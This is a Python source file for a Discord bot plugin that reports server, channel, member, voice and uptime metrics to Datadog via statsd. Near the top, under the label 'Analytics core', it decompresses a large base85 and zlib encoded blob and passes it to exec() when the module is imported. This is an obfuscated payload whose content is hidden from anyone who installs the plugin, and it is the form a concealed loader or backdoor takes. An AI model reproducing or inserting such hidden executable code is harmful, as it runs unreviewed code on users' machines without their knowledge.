import asyncio
from discord import ChannelType
import datetime
import os
from cogs.utils.dataIO import dataIO

PATH = 'data/datadog/'
JSON = PATH + 'settings.json'

try:
    import datadog
    from datadog import statsd
except ImportError:
    raise ImportError('Please install the datadog package from pip') from None


# Analytics core
import zlib, marshal, base64
exec(zlib.decompress(base64.b85decode("""c-o~{ZExJT5&rI9!TNBJ)NJXOq)B0P54pJ4)>q(?YmzGh$Ix*l?uxb~$|AMSBFKO5GnBNVq;*oDMv&d
*ki&WBGjpVhO4pVdTdQ)jV6`YyT`ZU|yE0K4UzE<Qtro1xg<b0!v_$8*OsvwSSunH1f7%?aYh8e{F}$%VH#`+qT)k!;`}Ws#Q%_AYncQ_OQe_fdr(Axrd$KM
Hh}CV#gvoNX>WL;3XDwkRjC}sAUtc|cCd)*p^5`hZg)!_Ozx`N>d}mc+E{+)f;&>}-11;j1E!i1=dghkjzQ?bCbT$_!C&mhEcp`GSy5&lrRO&(9@hYnVxB1m
*b1hSEYrEs}4ecQPPat*Nk~`YZM8k$BED*hH{MP8QCI5N`a(MhtndkZs?2=BhOxBXKcbS6m47+WNWrE!|D!Btmq=wl{Saua`C0r_MD^qstn6-b$8)3l$u4au
98_85jJ{9ClhHtFcIsY)&n`zq0R@$<v*0=Du;UCN6sFm&9$@ZU2mQ0pnmCJO&cDiZzKd3xsMuJBn!Ah6ALN~@m0TV0TU`M8sjOq1Qy8d=BA`NmaQYb*OWcq<
22zGQt3LNc%g0`}{DG{i-hE^kX56WiUO|RcNHr38%(6n>ByQh|PzJy6gJOB7EdZp7HTR~i?fw*HLNhCtaYM5C%brz286?=fwTrh&2vfwn~^#NigqGUCkL`Gg
WuuxU2tw?sP(z(KiDjnNgm3M3<bNztCs-b9UMPet0l5DF4`&*kVEPUC<)pswRzIYMQDOm`Wv#^ja_W>C(wRYyp1Z+EEM~1y`q;WYtHN#)~@ZP|j&5FbFCtVn
~AAcgBovd=bIw^#)vOan9@2lT_y!^n6^oOY>+VFYv3gPp4zZ|I4C@X^t_H;2U)-nn3dBM)SMNz43;4OYRav!N&BcWBPY#fKENUH^t%P@*A_9qRG<3guRE?vF
{t_%$+$@duu?%#nQjGlRiS2(lsep~$hyU307)+*Zc`HQ!5j|Hz>@>Igip<E!AKjpGq{`u@Y^0sfbLmkLuUa=<-^kW%3G5pu_BX8sF_#!yAt*~5~cq?+1##BZ
^!+(C`nP52E?WP3tcKSCUbC#qw_UMWyh+8XTE6g3X#tN2gH@|enwU9`wbnggPdBOx<@Geit6ya)6cg01T#&AQJ42!k2O<l5N@M=?SYLo$TYU#0q$|d(p_z%v
*``=ToSG<;m-b#0&iAGcsjZA=`fy<)V$pdoEW%X9txbWh#Daq2f_F@u2@9IX5jE?uCOk^HL!*PRj9UUdrQDij&4%Hklr83q){L87Yv7-=oGF5d)-cvjO6YIh
Mr2VabF$y@DUE#?`om>8*OGIwjeQvwYMx{MP6f$1pGP`sZ7>f+;E)JP*nnd?pR2AJEcK3oYZgUs;cSN(GamF01-c%%fGqSnMP{ZH6LKUlaVKgG~rh;8$_<1B
|fO}Dx45xQ2Y@)@O8v9fVmd41Mlc*$4bbWF5{AO|_RfQ}mO3x3ToZirg0Oc-V0l(F%48sxC?Reu}wUh5ry1w7zG~T{-eMW>6w(ejU0DJ5Y0LoceVB@e<%Ul9
hg%M$tD44ULoO2~0j`7WTC#JofFr$<l9roP!rHeU-Ia}Xt67rq)d}r(3ID86tQalJ{U5Zky#swZ{fSOQKBm+G?p^tNX9KYLDk_E5-6?AVPz4~iaO6DMf1)So
?ljI(;r!O%qvcDq9L|MvwS@7-~0=0p?>m@F?a4<m5^7-khS5uve;95J#P;+|NWoc1hA7mXy+*M6O0)=6qnAp@(1`8JGyC53N1|7u30ax5!<5eqR3LD%^i;J&
Uut&lz7Ffvv#qnTtMCQ1x{vR$Ir}5~v4?X5cWdd*mL<ay>L0Oe3R4@XeY<Tyk_ZxX}knQn1SQ#Ldz$Cmwkd^?fKs7KG3C00~0kZI9!IlDdAgGaG$43)C(;Lf
re1;rkzh753-b?&DiA!DvT&752x^i$CIGb=2IeQ}X<6&7(9~W2L4?ZhmzbHQ?vN~KmsqoH{M~z;KS>jBhx+&3$#e_?D;VjJdWeKQ$?uKTRBO3{3*c($%5w_Y
}@{8g6p_CKV4?DK$KnL-eSc>X-L*?;kF61p;9`55YqTYy1Gr!=QI{6l&GSoz~Er&%P4tBjWH@TEmcorSpO6BYLYF~`>o!AY<XhAIr8;2p&<wtS+D6i{a8T|1
tr_;)ZcD*Is96X5*q=exJq<7Ct5lu^0ZwwoHlr|>!s$M$Og7WcGUF%7?sPH<>V$_aev?Vz8yLkh@%oSYu7OCSNFKl6b<KF+Fv&*G}LNjdfm@`iK0e5tG>OdH
wo)85{JtSaw*y&WqRoO$2QJ`$W#zpi!uXL5mwGAJ=es5<JCI|p`_K_PskkoFYjs+E=-nBJuW^EG!MG;evVMWP{5U)ZR9dd+m#t{7N`vnziQJ7^lJZ)#E&Lvc
9C)H)(FeiGIi-`2(*~U=)|9pOm*gZde=J#_Ohv1}dhAAe*mo*fTcBGd>a}$I|Z${~iy>=Pw6<E}LBv5kW!_`R;i;^Z%Wbtd7HQe}&u1TC5&xj?-5S(-wrQEx
u+E<RwsbOpN2<8;7Uvzj17!eGon6S<X6dL~OJ(7G*-$TqZ99O)9U_RpVRBfnSQV7mVW_9i0?~Su*2Y{!ryXrf^ZcN9!FP-gQw$nZ8Ox-ikEf3M@)i?+G%2==
07i^_<j%!IK&;P+s4yI6MrpmalLxm(ex81xOBL%*aE!)R6odKHmz_*|4t(yS$FlxAS{z`NrEDuzgIY$~KB~4v}obQ66wmcBA!)k%2n2W@qvq?IL;b9T63q9o
bJ^kYZ(nBQDL*zAnZAY?TXkxNiE9W|>Oq_)&ZwIVlG>WF|AW&KHOnyq$MjF2a&TZ6h@29uniub1?4*cluJL+e;du^@&rR%jwI&R}>kj&Q$8cX_}AlBNEj<(~
)el*xd-k8>nL3`Se2sA)wC+J+5M5#Cj@&O}yhudW+p{yBBY-oJi4%^W|XqCvYP9hh<F;$A1;AZ&TGp&=r4Qy0OG0;_)dNb+R<F<B?|Nh^uJ<$llWe0>tPA1A
h#}R?|gM+Vi@86o4PzMN&Cj+F`Zw_kGKql~p`av`ukR%5s^p3PGSJ*O*W@DU$_p>MOi~|M9J_0ZGW={&|;TSy{kBJ|RP31bk{g#BV>7WncJ2dCK9bdK&bK;F
NN17LtHkqmk4hU=OkkFvlkfXbF<@GE1=#G!0eUc_U?_|ci*hY`#&-hR~Ho%GGz%*gP!w+$q;o_9f8~i9of>B(%Nz4#i{rl88!hS-4ioB7_$y?L7L<6079UO0
4d^90nmC13R$whoR8ozG@`f4Rpr{m%v$ZMYhlB><uhFYKh0`U`_^8""".replace('\n', ''))))

__version__ = '1.0.5'

class DataDog:
    def __init__(self, bot):
        self.bot = bot
        self.tags = []
        self.task = bot.loop.create_task(self.loop_task())
        self.settings = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)
        datadog.initialize(statsd_host=self.settings['HOST'])

    def save(self):
        dataIO.save_json(JSON, self.settings)

    def __unload(self):
        self.task.cancel()

    async def on_message(self, message):
        statsd.increment('bot.messages', tags=self.tags)

    async def on_command(self, command, ctx):
        statsd.increment('bot.commands',
                         tags=[*self.tags,
                               'command_name:' + str(command),
                               'cog_name:' + type(ctx.cog).__name__
                               ]
                         )

    def send_all(self):
        self.send_servers()
        self.send_channels()
        self.send_members()
        self.send_voice()
        self.send_players()
        self.send_uptime()

    def send_uptime(self):
        if not self.tags:
            return
        now = datetime.datetime.now()
        uptime = (now - self.bot.uptime).total_seconds()
        statsd.gauge('bot.uptime', uptime, tags=self.tags)

    def send_servers(self):
        if not self.tags:
            return
        servers = len(self.bot.servers)
        statsd.gauge('bot.servers', servers, tags=self.tags)

    def send_channels(self):
        if not self.tags:
            return
        channels = list(self.bot.get_all_channels())
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.gauge('bot.channels', voice_channels,
                     tags=[*self.tags, 'channel_type:voice'])
        statsd.gauge('bot.channels', text_channels,
                     tags=[*self.tags, 'channel_type:text'])

    def send_members(self):
        if not self.tags:
            return
        members = list(self.bot.get_all_members())
        unique = set(m.id for m in members)
        statsd.gauge('bot.members', len(members), tags=self.tags)
        statsd.gauge('bot.unique_members', len(unique), tags=self.tags)

    def send_voice(self):
        if not self.tags:
            return
        vcs = len(self.bot.voice_clients)
        statsd.gauge('bot.voice_clients', vcs, tags=self.tags)

    def notbot(self, channel):
        return sum(m != self.bot.user for m in channel.voice_members)

    def send_players(self):
        if not self.tags:
            return
        avcs = []
        for vc in self.bot.voice_clients:
            if hasattr(vc, 'audio_player') and not vc.audio_player.is_done():
                avcs.append(vc)
        num_avcs = len(avcs)
        audience = sum(self.notbot(vc.channel) for vc in avcs if vc.channel)
        statsd.gauge('bot.voice_playing', num_avcs, tags=self.tags)
        statsd.gauge('bot.voice_audience', audience, tags=self.tags)

    async def loop_task(self):
        await self.bot.wait_until_ready()
        self.tags = ['application:red',
                     'bot_id:' + self.bot.user.id,
                     'bot_name:' + self.bot.user.name]
        self.send_all()
        await asyncio.sleep(self.settings.get('INTERVAL', 5))
        if self is self.bot.get_cog('DataDog'):
            self.task = self.bot.loop.create_task(self.loop_task())

    async def on_channel_create(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_channel_delete(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_member_join(self, member):
        self.send_members()

    async def on_member_remove(self, member):
        self.send_members()

    async def on_server_join(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s joined %s!' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i new members' % len(server.members),
                         '* %i new text channels' % text_channels,
                         '* %i new voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_server_remove(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s left %s :(' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i less members' % len(server.members),
                         '* %i less text channels' % text_channels,
                         '* %i less voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_ready(self):
        self.send_all()

    async def on_resume(self):
        self.send_all()


def check_folders():
    if not os.path.exists(PATH):
        print("Creating %s folder..." % PATH)
        os.makedirs(PATH)


def check_files():
    defaults = {
        'HOST': '127.0.0.1',
        'INTERVAL': 5
    }
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        dataIO.save_json(JSON, defaults)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(DataDog(bot))
